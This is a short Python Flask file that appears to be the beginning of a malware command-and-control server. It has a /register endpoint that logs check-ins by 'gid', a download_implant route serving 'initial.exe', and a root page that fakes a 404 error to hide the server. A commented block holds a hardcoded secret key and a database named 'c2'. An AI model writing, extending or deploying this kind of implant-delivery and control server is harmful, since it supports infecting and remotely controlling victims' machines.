import flask
from flask import Flask, Response, request, render_template, redirect, send_from_directory, url_for
from flaskext.mysql import MySQL
from collections import Counter
import flask_login
import os, base64

# Init DB
# mysql = MySQL()
app = Flask(__name__)
# app.secret_key = '6AC6663F6BCFEB4191481AC41972DBEE4BDF6E7AA43E74F7E64C5F07DE69CE02'
# app.config['MYSQL_DATABASE_USER'] = 'root'
# app.config['MYSQL_DATABASE_PASSWORD'] = ''
# app.config['MYSQL_DATABASE_DB'] = 'c2'
# app.config['MYSQL_DATABASE_HOST'] = 'localhost'
# mysql.init_app(app)

@app.route('/register', methods=['POST'])
def register():
	print(request.json['gid'])
	return 'Registered'

@app.route('/initial', methods=['GET'])
def download_implant():
	return send_from_directory(directory=app.root_path, filename='initial.exe')

@app.route('/')
def home():
    return '<h1>404 Page Not Found</h1>'

if __name__ == "__main__":
	app.run(port=5000, debug=True)
